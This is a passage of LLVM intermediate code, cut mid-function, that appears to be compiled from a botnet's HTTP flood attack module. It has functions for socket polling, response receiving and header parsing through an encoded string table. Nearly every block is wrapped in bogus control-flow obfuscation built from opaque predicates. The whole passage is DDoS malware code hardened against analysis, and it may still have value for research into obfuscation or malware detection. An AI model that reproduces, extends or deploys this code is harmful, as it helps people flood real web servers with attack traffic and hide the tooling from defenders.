  %1548 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1547, i32 0, i32 0
  %1549 = load i32, i32* %1548, align 4
  %1550 = icmp eq i32 %1549, -1
  br i1 %1550, label %1551, label %1568

; <label>:1551:                                   ; preds = %1542
  %1552 = load i32, i32* @x.17
  %1553 = load i32, i32* @y.18
  %1554 = sub i32 %1552, 1
  %1555 = mul i32 %1552, %1554
  %1556 = urem i32 %1555, 2
  %1557 = icmp eq i32 %1556, 0
  %1558 = icmp slt i32 %1553, 10
  %1559 = or i1 %1557, %1558
  br i1 %1559, label %originalBB293, label %originalBB293alteredBB

originalBB293:                                    ; preds = %originalBB293alteredBB, %1551
  %1560 = load i32, i32* @x.17
  %1561 = load i32, i32* @y.18
  %1562 = sub i32 %1560, 1
  %1563 = mul i32 %1560, %1562
  %1564 = urem i32 %1563, 2
  %1565 = icmp eq i32 %1564, 0
  %1566 = icmp slt i32 %1561, 10
  %1567 = or i1 %1565, %1566
  br i1 %1567, label %originalBBpart2295, label %originalBB293alteredBB

originalBBpart2295:                               ; preds = %originalBB293
  br label %4137

; <label>:1568:                                   ; preds = %1542
  %1569 = load i32, i32* @x.17
  %1570 = load i32, i32* @y.18
  %1571 = sub i32 %1569, 1
  %1572 = mul i32 %1569, %1571
  %1573 = urem i32 %1572, 2
  %1574 = icmp eq i32 %1573, 0
  %1575 = icmp slt i32 %1570, 10
  %1576 = or i1 %1574, %1575
  br i1 %1576, label %originalBB297, label %originalBB297alteredBB

originalBB297:                                    ; preds = %originalBB297alteredBB, %1568
  %1577 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %1578 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1578, i32 0, i32 0
  %1580 = load i32, i32* %1579, align 4
  %1581 = sdiv i32 %1580, 64
  %1582 = sext i32 %1581 to i64
  %1583 = getelementptr inbounds [16 x i64], [16 x i64]* %1577, i64 0, i64 %1582
  %1584 = load i64, i64* %1583, align 8
  %1585 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1585, i32 0, i32 0
  %1587 = load i32, i32* %1586, align 4
  %1588 = srem i32 %1587, 64
  %1589 = zext i32 %1588 to i64
  %1590 = shl i64 1, %1589
  %1591 = and i64 %1584, %1590
  %1592 = icmp ne i64 %1591, 0
  %1593 = load i32, i32* @x.17
  %1594 = load i32, i32* @y.18
  %1595 = sub i32 %1593, 1
  %1596 = mul i32 %1593, %1595
  %1597 = urem i32 %1596, 2
  %1598 = icmp eq i32 %1597, 0
  %1599 = icmp slt i32 %1594, 10
  %1600 = or i1 %1598, %1599
  br i1 %1600, label %originalBBpart2327, label %originalBB297alteredBB

originalBBpart2327:                               ; preds = %originalBB297
  br i1 %1592, label %1601, label %1657

; <label>:1601:                                   ; preds = %originalBBpart2327
  store i32 0, i32* %43, align 4
  store i32 4, i32* %44, align 4
  %1602 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1603 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1602, i32 0, i32 0
  %1604 = load i32, i32* %1603, align 4
  %1605 = bitcast i32* %43 to i8*
  %1606 = call i32 @getsockopt(i32 %1604, i32 1, i32 4, i8* %1605, i32* %44) #6
  store i32 %1606, i32* %20, align 4
  %1607 = load i32, i32* %43, align 4
  %1608 = icmp eq i32 %1607, 0
  br i1 %1608, label %1609, label %1615

; <label>:1609:                                   ; preds = %1601
  %1610 = load i32, i32* %20, align 4
  %1611 = icmp eq i32 %1610, 0
  br i1 %1611, label %1612, label %1615

; <label>:1612:                                   ; preds = %1609
  %1613 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1614 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1613, i32 0, i32 1
  store i8 4, i8* %1614, align 4
  br label %1640

; <label>:1615:                                   ; preds = %1609, %1601
  %1616 = load i32, i32* @x.17
  %1617 = load i32, i32* @y.18
  %1618 = sub i32 %1616, 1
  %1619 = mul i32 %1616, %1618
  %1620 = urem i32 %1619, 2
  %1621 = icmp eq i32 %1620, 0
  %1622 = icmp slt i32 %1617, 10
  %1623 = or i1 %1621, %1622
  br i1 %1623, label %originalBB329, label %originalBB329alteredBB

originalBB329:                                    ; preds = %originalBB329alteredBB, %1615
  %1624 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1625 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1624, i32 0, i32 0
  %1626 = load i32, i32* %1625, align 4
  %1627 = call i32 @close(i32 %1626)
  %1628 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1629 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1628, i32 0, i32 0
  store i32 -1, i32* %1629, align 4
  %1630 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1630, i32 0, i32 1
  store i8 0, i8* %1631, align 4
  %1632 = load i32, i32* @x.17
  %1633 = load i32, i32* @y.18
  %1634 = sub i32 %1632, 1
  %1635 = mul i32 %1632, %1634
  %1636 = urem i32 %1635, 2
  %1637 = icmp eq i32 %1636, 0
  %1638 = icmp slt i32 %1633, 10
  %1639 = or i1 %1637, %1638
  br i1 %1639, label %originalBBpart2331, label %originalBB329alteredBB

originalBBpart2331:                               ; preds = %originalBB329
  br label %4137

; <label>:1640:                                   ; preds = %1612
  %1641 = load i32, i32* @x.17
  %1642 = load i32, i32* @y.18
  %1643 = sub i32 %1641, 1
  %1644 = mul i32 %1641, %1643
  %1645 = urem i32 %1644, 2
  %1646 = icmp eq i32 %1645, 0
  %1647 = icmp slt i32 %1642, 10
  %1648 = or i1 %1646, %1647
  br i1 %1648, label %originalBB333, label %originalBB333alteredBB

originalBB333:                                    ; preds = %originalBB333alteredBB, %1640
  %1649 = load i32, i32* @x.17
  %1650 = load i32, i32* @y.18
  %1651 = sub i32 %1649, 1
  %1652 = mul i32 %1649, %1651
  %1653 = urem i32 %1652, 2
  %1654 = icmp eq i32 %1653, 0
  %1655 = icmp slt i32 %1650, 10
  %1656 = or i1 %1654, %1655
  br i1 %1656, label %originalBBpart2335, label %originalBB333alteredBB

originalBBpart2335:                               ; preds = %originalBB333
  br label %1657

; <label>:1657:                                   ; preds = %originalBBpart2335, %originalBBpart2327
  %1658 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1659 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1660 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1659, i32 0, i32 0
  %1661 = load i32, i32* %1660, align 4
  %1662 = sdiv i32 %1661, 64
  %1663 = sext i32 %1662 to i64
  %1664 = getelementptr inbounds [16 x i64], [16 x i64]* %1658, i64 0, i64 %1663
  %1665 = load i64, i64* %1664, align 8
  %1666 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1666, i32 0, i32 0
  %1668 = load i32, i32* %1667, align 4
  %1669 = srem i32 %1668, 64
  %1670 = zext i32 %1669 to i64
  %1671 = shl i64 1, %1670
  %1672 = and i64 %1665, %1671
  %1673 = icmp ne i64 %1672, 0
  br i1 %1673, label %1674, label %4136

; <label>:1674:                                   ; preds = %1657
  %1675 = load i32, i32* @x.17
  %1676 = load i32, i32* @y.18
  %1677 = sub i32 %1675, 1
  %1678 = mul i32 %1675, %1677
  %1679 = urem i32 %1678, 2
  %1680 = icmp eq i32 %1679, 0
  %1681 = icmp slt i32 %1676, 10
  %1682 = or i1 %1680, %1681
  br i1 %1682, label %originalBB337, label %originalBB337alteredBB

originalBB337:                                    ; preds = %originalBB337alteredBB, %1674
  %1683 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1684 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1683, i32 0, i32 1
  %1685 = load i8, i8* %1684, align 4
  %1686 = zext i8 %1685 to i32
  %1687 = icmp eq i32 %1686, 6
  %1688 = load i32, i32* @x.17
  %1689 = load i32, i32* @y.18
  %1690 = sub i32 %1688, 1
  %1691 = mul i32 %1688, %1690
  %1692 = urem i32 %1691, 2
  %1693 = icmp eq i32 %1692, 0
  %1694 = icmp slt i32 %1689, 10
  %1695 = or i1 %1693, %1694
  br i1 %1695, label %originalBBpart2339, label %originalBB337alteredBB

originalBBpart2339:                               ; preds = %originalBB337
  br i1 %1687, label %1696, label %3411

; <label>:1696:                                   ; preds = %originalBBpart2339
  store i32 0, i32* %45, align 4
  %1697 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  call void @util_zero(i8* %1697, i32 10240)
  %1698 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1699 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1698, i32 0, i32 0
  %1700 = load i32, i32* %1699, align 4
  %1701 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1702 = call i64 @recv(i32 %1700, i8* %1701, i64 10240, i32 16386)
  %1703 = trunc i64 %1702 to i32
  store i32 %1703, i32* %20, align 4
  %1704 = icmp slt i32 %1703, 1
  br i1 %1704, label %1705, label %1714

; <label>:1705:                                   ; preds = %1696
  %1706 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1707 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1706, i32 0, i32 0
  %1708 = load i32, i32* %1707, align 4
  %1709 = call i32 @close(i32 %1708)
  %1710 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1711 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1710, i32 0, i32 0
  store i32 -1, i32* %1711, align 4
  %1712 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1713 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1712, i32 0, i32 1
  store i8 0, i8* %1713, align 4
  br label %4137

; <label>:1714:                                   ; preds = %1696
  %1715 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1716 = load i32, i32* %20, align 4
  %1717 = call i32 @util_memsearch(i8* %1715, i32 %1716, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1718 = icmp eq i32 %1717, -1
  br i1 %1718, label %1719, label %1739

; <label>:1719:                                   ; preds = %1714
  %1720 = load i32, i32* %20, align 4
  %1721 = icmp slt i32 %1720, 10240
  br i1 %1721, label %1722, label %1739

; <label>:1722:                                   ; preds = %1719
  %1723 = load i32, i32* @x.17
  %1724 = load i32, i32* @y.18
  %1725 = sub i32 %1723, 1
  %1726 = mul i32 %1723, %1725
  %1727 = urem i32 %1726, 2
  %1728 = icmp eq i32 %1727, 0
  %1729 = icmp slt i32 %1724, 10
  %1730 = or i1 %1728, %1729
  br i1 %1730, label %originalBB341, label %originalBB341alteredBB

originalBB341:                                    ; preds = %originalBB341alteredBB, %1722
  %1731 = load i32, i32* @x.17
  %1732 = load i32, i32* @y.18
  %1733 = sub i32 %1731, 1
  %1734 = mul i32 %1731, %1733
  %1735 = urem i32 %1734, 2
  %1736 = icmp eq i32 %1735, 0
  %1737 = icmp slt i32 %1732, 10
  %1738 = or i1 %1736, %1737
  br i1 %1738, label %originalBBpart2343, label %originalBB341alteredBB

originalBBpart2343:                               ; preds = %originalBB341
  br label %4137

; <label>:1739:                                   ; preds = %1719, %1714
  %1740 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1741 = load i32, i32* %20, align 4
  %1742 = call i32 @util_memsearch(i8* %1740, i32 %1741, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1743 = sext i32 %1742 to i64
  %1744 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1743
  store i8 0, i8* %1744, align 1
  %1745 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1746 = load i32, i32* %20, align 4
  %1747 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1748 = call i32 @util_stristr(i8* %1745, i32 %1746, i8* %1747)
  %1749 = icmp ne i32 %1748, -1
  br i1 %1749, label %1750, label %1753

; <label>:1750:                                   ; preds = %1739
  %1751 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1752 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1751, i32 0, i32 11
  store i32 2, i32* %1752, align 4
  br label %1753

; <label>:1753:                                   ; preds = %1750, %1739
  %1754 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1755 = load i32, i32* %20, align 4
  %1756 = call i8* @table_retrieve_val(i32 52, i32* null)
  %1757 = call i32 @util_stristr(i8* %1754, i32 %1755, i8* %1756)
  %1758 = icmp ne i32 %1757, -1
  br i1 %1758, label %1759, label %1762

; <label>:1759:                                   ; preds = %1753
  %1760 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1761 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1760, i32 0, i32 11
  store i32 1, i32* %1761, align 4
  br label %1762

; <label>:1762:                                   ; preds = %1759, %1753
  %1763 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1764 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1763, i32 0, i32 12
  store i32 0, i32* %1764, align 4
  %1765 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1766 = load i32, i32* %20, align 4
  %1767 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1768 = call i32 @util_stristr(i8* %1765, i32 %1766, i8* %1767)
  %1769 = icmp ne i32 %1768, -1
  br i1 %1769, label %1770, label %1869

; <label>:1770:                                   ; preds = %1762
  %1771 = load i32, i32* @x.17
  %1772 = load i32, i32* @y.18
  %1773 = sub i32 %1771, 1
  %1774 = mul i32 %1771, %1773
  %1775 = urem i32 %1774, 2
  %1776 = icmp eq i32 %1775, 0
  %1777 = icmp slt i32 %1772, 10
  %1778 = or i1 %1776, %1777
  br i1 %1778, label %originalBB345, label %originalBB345alteredBB

originalBB345:                                    ; preds = %originalBB345alteredBB, %1770
  %1779 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1780 = load i32, i32* %20, align 4
  %1781 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1782 = call i32 @util_stristr(i8* %1779, i32 %1780, i8* %1781)
  store i32 %1782, i32* %46, align 4
  %1783 = load i32, i32* %46, align 4
  %1784 = sext i32 %1783 to i64
  %1785 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1784
  %1786 = load i8, i8* %1785, align 1
  %1787 = sext i8 %1786 to i32
  %1788 = icmp eq i32 %1787, 32
  %1789 = load i32, i32* @x.17
  %1790 = load i32, i32* @y.18
  %1791 = sub i32 %1789, 1
  %1792 = mul i32 %1789, %1791
  %1793 = urem i32 %1792, 2
  %1794 = icmp eq i32 %1793, 0
  %1795 = icmp slt i32 %1790, 10
  %1796 = or i1 %1794, %1795
  br i1 %1796, label %originalBBpart2347, label %originalBB345alteredBB

originalBBpart2347:                               ; preds = %originalBB345
  br i1 %1788, label %1797, label %1800

; <label>:1797:                                   ; preds = %originalBBpart2347
  %1798 = load i32, i32* %46, align 4
  %1799 = add nsw i32 %1798, 1
  store i32 %1799, i32* %46, align 4
  br label %1800

; <label>:1800:                                   ; preds = %1797, %originalBBpart2347
  %1801 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1802 = load i32, i32* %46, align 4
  %1803 = sext i32 %1802 to i64
  %1804 = getelementptr inbounds i8, i8* %1801, i64 %1803
  %1805 = load i32, i32* %20, align 4
  %1806 = load i32, i32* %46, align 4
  %1807 = sub nsw i32 %1805, %1806
  %1808 = call i32 @util_memsearch(i8* %1804, i32 %1807, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1808, i32* %47, align 4
  %1809 = load i32, i32* %47, align 4
  %1810 = icmp ne i32 %1809, -1
  br i1 %1810, label %1811, label %1868

; <label>:1811:                                   ; preds = %1800
  %1812 = load i32, i32* %46, align 4
  %1813 = sext i32 %1812 to i64
  %1814 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1813
  store i8* %1814, i8** %48, align 8
  %1815 = load i32, i32* %47, align 4
  %1816 = icmp sge i32 %1815, 2
  br i1 %1816, label %1817, label %1820

; <label>:1817:                                   ; preds = %1811
  %1818 = load i32, i32* %47, align 4
  %1819 = sub nsw i32 %1818, 2
  store i32 %1819, i32* %47, align 4
  br label %1820

; <label>:1820:                                   ; preds = %1817, %1811
  %1821 = load i32, i32* @x.17
  %1822 = load i32, i32* @y.18
  %1823 = sub i32 %1821, 1
  %1824 = mul i32 %1821, %1823
  %1825 = urem i32 %1824, 2
  %1826 = icmp eq i32 %1825, 0
  %1827 = icmp slt i32 %1822, 10
  %1828 = or i1 %1826, %1827
  br i1 %1828, label %originalBB349, label %originalBB349alteredBB

originalBB349:                                    ; preds = %originalBB349alteredBB, %1820
  %1829 = load i32, i32* %46, align 4
  %1830 = load i32, i32* %47, align 4
  %1831 = add nsw i32 %1829, %1830
  %1832 = sext i32 %1831 to i64
  %1833 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1832
  store i8 0, i8* %1833, align 1
  %1834 = load i8*, i8** %48, align 8
  %1835 = load i8*, i8** %48, align 8
  %1836 = call i32 @util_strlen(i8* %1835)
  %1837 = call i8* @table_retrieve_val(i32 50, i32* null)
  %1838 = call i32 @util_stristr(i8* %1834, i32 %1836, i8* %1837)
  %1839 = icmp ne i32 %1838, 0
  %1840 = load i32, i32* @x.17
  %1841 = load i32, i32* @y.18
  %1842 = sub i32 %1840, 1
  %1843 = mul i32 %1840, %1842
  %1844 = urem i32 %1843, 2
  %1845 = icmp eq i32 %1844, 0
  %1846 = icmp slt i32 %1841, 10
  %1847 = or i1 %1845, %1846
  br i1 %1847, label %originalBBpart2360, label %originalBB349alteredBB

originalBBpart2360:                               ; preds = %originalBB349
  br i1 %1839, label %1848, label %1867

; <label>:1848:                                   ; preds = %originalBBpart2360
  %1849 = load i32, i32* @x.17
  %1850 = load i32, i32* @y.18
  %1851 = sub i32 %1849, 1
  %1852 = mul i32 %1849, %1851
  %1853 = urem i32 %1852, 2
  %1854 = icmp eq i32 %1853, 0
  %1855 = icmp slt i32 %1850, 10
  %1856 = or i1 %1854, %1855
  br i1 %1856, label %originalBB362, label %originalBB362alteredBB

originalBB362:                                    ; preds = %originalBB362alteredBB, %1848
  %1857 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1858 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1857, i32 0, i32 12
  store i32 1, i32* %1858, align 4
  %1859 = load i32, i32* @x.17
  %1860 = load i32, i32* @y.18
  %1861 = sub i32 %1859, 1
  %1862 = mul i32 %1859, %1861
  %1863 = urem i32 %1862, 2
  %1864 = icmp eq i32 %1863, 0
  %1865 = icmp slt i32 %1860, 10
  %1866 = or i1 %1864, %1865
  br i1 %1866, label %originalBBpart2364, label %originalBB362alteredBB

originalBBpart2364:                               ; preds = %originalBB362
  br label %1867

; <label>:1867:                                   ; preds = %originalBBpart2364, %originalBBpart2360
  br label %1868

; <label>:1868:                                   ; preds = %1867, %1800
  br label %1869

; <label>:1869:                                   ; preds = %1868, %1762
  %1870 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1871 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1870, i32 0, i32 13
  store i32 0, i32* %1871, align 4
  %1872 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1873 = load i32, i32* %20, align 4
  %1874 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1875 = call i32 @util_stristr(i8* %1872, i32 %1873, i8* %1874)
  %1876 = icmp ne i32 %1875, -1
  br i1 %1876, label %1877, label %2008

; <label>:1877:                                   ; preds = %1869
  %1878 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1879 = load i32, i32* %20, align 4
  %1880 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1881 = call i32 @util_stristr(i8* %1878, i32 %1879, i8* %1880)
  store i32 %1881, i32* %49, align 4
  %1882 = load i32, i32* %49, align 4
  %1883 = sext i32 %1882 to i64
  %1884 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1883
  %1885 = load i8, i8* %1884, align 1
  %1886 = sext i8 %1885 to i32
  %1887 = icmp eq i32 %1886, 32
  br i1 %1887, label %1888, label %1907

; <label>:1888:                                   ; preds = %1877
  %1889 = load i32, i32* @x.17
  %1890 = load i32, i32* @y.18
  %1891 = sub i32 %1889, 1
  %1892 = mul i32 %1889, %1891
  %1893 = urem i32 %1892, 2
  %1894 = icmp eq i32 %1893, 0
  %1895 = icmp slt i32 %1890, 10
  %1896 = or i1 %1894, %1895
  br i1 %1896, label %originalBB366, label %originalBB366alteredBB

originalBB366:                                    ; preds = %originalBB366alteredBB, %1888
  %1897 = load i32, i32* %49, align 4
  %1898 = add nsw i32 %1897, 1
  store i32 %1898, i32* %49, align 4
  %1899 = load i32, i32* @x.17
  %1900 = load i32, i32* @y.18
  %1901 = sub i32 %1899, 1
  %1902 = mul i32 %1899, %1901
  %1903 = urem i32 %1902, 2
  %1904 = icmp eq i32 %1903, 0
  %1905 = icmp slt i32 %1900, 10
  %1906 = or i1 %1904, %1905
  br i1 %1906, label %originalBBpart2379, label %originalBB366alteredBB

originalBBpart2379:                               ; preds = %originalBB366
  br label %1907

; <label>:1907:                                   ; preds = %originalBBpart2379, %1877
  %1908 = load i32, i32* @x.17
  %1909 = load i32, i32* @y.18
  %1910 = sub i32 %1908, 1
  %1911 = mul i32 %1908, %1910
  %1912 = urem i32 %1911, 2
  %1913 = icmp eq i32 %1912, 0
  %1914 = icmp slt i32 %1909, 10
  %1915 = or i1 %1913, %1914
  br i1 %1915, label %originalBB381, label %originalBB381alteredBB

originalBB381:                                    ; preds = %originalBB381alteredBB, %1907
  %1916 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1917 = load i32, i32* %49, align 4
  %1918 = sext i32 %1917 to i64
  %1919 = getelementptr inbounds i8, i8* %1916, i64 %1918
  %1920 = load i32, i32* %20, align 4
  %1921 = load i32, i32* %49, align 4
  %1922 = sub nsw i32 %1920, %1921
  %1923 = call i32 @util_memsearch(i8* %1919, i32 %1922, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1923, i32* %50, align 4
  %1924 = load i32, i32* %50, align 4
  %1925 = icmp ne i32 %1924, -1
  %1926 = load i32, i32* @x.17
  %1927 = load i32, i32* @y.18
  %1928 = sub i32 %1926, 1
  %1929 = mul i32 %1926, %1928
  %1930 = urem i32 %1929, 2
  %1931 = icmp eq i32 %1930, 0
  %1932 = icmp slt i32 %1927, 10
  %1933 = or i1 %1931, %1932
  br i1 %1933, label %originalBBpart2390, label %originalBB381alteredBB

originalBBpart2390:                               ; preds = %originalBB381
  br i1 %1925, label %1934, label %2007

; <label>:1934:                                   ; preds = %originalBBpart2390
  %1935 = load i32, i32* %49, align 4
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1936
  store i8* %1937, i8** %51, align 8
  %1938 = load i32, i32* %50, align 4
  %1939 = icmp sge i32 %1938, 2
  br i1 %1939, label %1940, label %1959

; <label>:1940:                                   ; preds = %1934
  %1941 = load i32, i32* @x.17
  %1942 = load i32, i32* @y.18
  %1943 = sub i32 %1941, 1
  %1944 = mul i32 %1941, %1943
  %1945 = urem i32 %1944, 2
  %1946 = icmp eq i32 %1945, 0
  %1947 = icmp slt i32 %1942, 10
  %1948 = or i1 %1946, %1947
  br i1 %1948, label %originalBB392, label %originalBB392alteredBB

originalBB392:                                    ; preds = %originalBB392alteredBB, %1940
  %1949 = load i32, i32* %50, align 4
  %1950 = sub nsw i32 %1949, 2
  store i32 %1950, i32* %50, align 4
  %1951 = load i32, i32* @x.17
  %1952 = load i32, i32* @y.18
  %1953 = sub i32 %1951, 1
  %1954 = mul i32 %1951, %1953
  %1955 = urem i32 %1954, 2
  %1956 = icmp eq i32 %1955, 0
  %1957 = icmp slt i32 %1952, 10
  %1958 = or i1 %1956, %1957
  br i1 %1958, label %originalBBpart2402, label %originalBB392alteredBB

originalBBpart2402:                               ; preds = %originalBB392
  br label %1959

; <label>:1959:                                   ; preds = %originalBBpart2402, %1934
  %1960 = load i32, i32* @x.17
  %1961 = load i32, i32* @y.18
  %1962 = sub i32 %1960, 1
  %1963 = mul i32 %1960, %1962
  %1964 = urem i32 %1963, 2
  %1965 = icmp eq i32 %1964, 0
  %1966 = icmp slt i32 %1961, 10
  %1967 = or i1 %1965, %1966
  br i1 %1967, label %originalBB404, label %originalBB404alteredBB

originalBB404:                                    ; preds = %originalBB404alteredBB, %1959
  %1968 = load i32, i32* %49, align 4
  %1969 = load i32, i32* %50, align 4
  %1970 = add nsw i32 %1968, %1969
  %1971 = sext i32 %1970 to i64
  %1972 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1971
  store i8 0, i8* %1972, align 1
  %1973 = load i8*, i8** %51, align 8
  %1974 = load i8*, i8** %51, align 8
  %1975 = call i32 @util_strlen(i8* %1974)
  %1976 = call i8* @table_retrieve_val(i32 49, i32* null)
  %1977 = call i32 @util_stristr(i8* %1973, i32 %1975, i8* %1976)
  %1978 = icmp ne i32 %1977, 0
  %1979 = load i32, i32* @x.17
  %1980 = load i32, i32* @y.18
  %1981 = sub i32 %1979, 1
  %1982 = mul i32 %1979, %1981
  %1983 = urem i32 %1982, 2
  %1984 = icmp eq i32 %1983, 0
  %1985 = icmp slt i32 %1980, 10
  %1986 = or i1 %1984, %1985
  br i1 %1986, label %originalBBpart2407, label %originalBB404alteredBB

originalBBpart2407:                               ; preds = %originalBB404
  br i1 %1978, label %1987, label %2006

; <label>:1987:                                   ; preds = %originalBBpart2407
  %1988 = load i32, i32* @x.17
  %1989 = load i32, i32* @y.18
  %1990 = sub i32 %1988, 1
  %1991 = mul i32 %1988, %1990
  %1992 = urem i32 %1991, 2
  %1993 = icmp eq i32 %1992, 0
  %1994 = icmp slt i32 %1989, 10
  %1995 = or i1 %1993, %1994
  br i1 %1995, label %originalBB409, label %originalBB409alteredBB

originalBB409:                                    ; preds = %originalBB409alteredBB, %1987
  %1996 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1997 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1996, i32 0, i32 13
  store i32 1, i32* %1997, align 4
  %1998 = load i32, i32* @x.17
  %1999 = load i32, i32* @y.18
  %2000 = sub i32 %1998, 1
  %2001 = mul i32 %1998, %2000
  %2002 = urem i32 %2001, 2
  %2003 = icmp eq i32 %2002, 0
  %2004 = icmp slt i32 %1999, 10
  %2005 = or i1 %2003, %2004
  br i1 %2005, label %originalBBpart2411, label %originalBB409alteredBB

originalBBpart2411:                               ; preds = %originalBB409
  br label %2006

; <label>:2006:                                   ; preds = %originalBBpart2411, %originalBBpart2407
  br label %2007

; <label>:2007:                                   ; preds = %2006, %originalBBpart2390
  br label %2008

; <label>:2008:                                   ; preds = %2007, %1869
  %2009 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2010 = load i32, i32* %20, align 4
  %2011 = call i8* @table_retrieve_val(i32 47, i32* null)
  %2012 = call i32 @util_stristr(i8* %2009, i32 %2010, i8* %2011)
  %2013 = icmp ne i32 %2012, -1
  br i1 %2013, label %2014, label %2075

; <label>:2014:                                   ; preds = %2008
  %2015 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2016 = load i32, i32* %20, align 4
  %2017 = call i8* @table_retrieve_val(i32 47, i32* null)
  %2018 = call i32 @util_stristr(i8* %2015, i32 %2016, i8* %2017)
  store i32 %2018, i32* %52, align 4
  %2019 = load i32, i32* %52, align 4
  %2020 = sext i32 %2019 to i64
  %2021 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2020
  %2022 = load i8, i8* %2021, align 1
  %2023 = sext i8 %2022 to i32
  %2024 = icmp eq i32 %2023, 32
  br i1 %2024, label %2025, label %2028

; <label>:2025:                                   ; preds = %2014
  %2026 = load i32, i32* %52, align 4
  %2027 = add nsw i32 %2026, 1
  store i32 %2027, i32* %52, align 4
  br label %2028

; <label>:2028:                                   ; preds = %2025, %2014
  %2029 = load i32, i32* @x.17
  %2030 = load i32, i32* @y.18
  %2031 = sub i32 %2029, 1
  %2032 = mul i32 %2029, %2031
  %2033 = urem i32 %2032, 2
  %2034 = icmp eq i32 %2033, 0
  %2035 = icmp slt i32 %2030, 10
  %2036 = or i1 %2034, %2035
  br i1 %2036, label %originalBB413, label %originalBB413alteredBB

originalBB413:                                    ; preds = %originalBB413alteredBB, %2028
  %2037 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2038 = load i32, i32* %52, align 4
  %2039 = sext i32 %2038 to i64
  %2040 = getelementptr inbounds i8, i8* %2037, i64 %2039
  %2041 = load i32, i32* %20, align 4
  %2042 = load i32, i32* %52, align 4
